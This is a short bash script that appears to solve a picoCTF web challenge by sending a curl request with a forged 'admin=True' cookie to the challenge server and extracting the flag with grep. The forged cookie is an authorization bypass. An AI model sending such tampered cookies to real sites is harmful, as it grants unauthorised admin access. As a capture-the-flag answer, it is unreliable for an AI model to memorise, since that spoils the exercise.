#!/bin/bash

curl -s -H "Cookie: admin=True" "https://jupiter.challenges.picoctf.org/problem/39681/flag" | grep --color=none -oE "picoCTF{.*}"
